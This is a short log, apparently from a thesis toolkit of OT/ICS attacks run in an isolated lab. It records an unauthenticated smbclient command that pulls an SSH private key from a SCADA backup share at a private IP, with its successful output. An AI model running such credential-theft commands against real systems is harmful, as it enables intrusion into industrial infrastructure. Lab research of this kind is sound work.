@@ -1,0 +1,12 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  Samba - Descarga de clave SSH sin autenticar
+======================================================================
+  Fecha      : 2026-10-12 12:26:59
+  Objetivo   : //192.168.60.50/Backups_SCADA
+  MITRE ICS  : T1039, T1552.004
+======================================================================
+$ smbclient //192.168.60.50/Backups_SCADA -N -c cd ssh_keys; get id_rsa
+getting file \ssh_keys\id_rsa of size 1831 as id_rsa (31.4 KiloBytes/sec) (average 31.4 KiloBytes/sec)
+[=] Código de salida: 0
+[+] Clave descargada en /ataques/work/id_rsa (chmod 600).
